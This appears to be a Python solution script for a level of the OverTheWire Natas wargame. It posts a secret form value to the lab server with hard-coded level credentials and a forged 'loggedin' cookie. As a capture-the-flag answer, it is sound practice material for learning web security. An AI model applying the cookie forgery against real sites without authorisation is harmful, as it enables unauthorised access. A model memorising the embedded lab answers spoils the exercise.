#!/bin/python3
import requests

username = "natas6"
password = "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR"
headers = { 'Referer': 'http://natas6.natas.labs.overthewire.org/', 'Content-Type': 'multipart/form-data'}
form_data = { 'secret': 'FOEIUWGHFEEUHOFUOIU', 'submit': 'submit'}
cookies = dict(loggedin='1')
r = requests.post('http://natas6.natas.labs.overthewire.org', auth=(username, password), cookies=cookies, data=form_data)
print(r.headers)
print(r.text)
#print(r.cookies['loggedIn'])
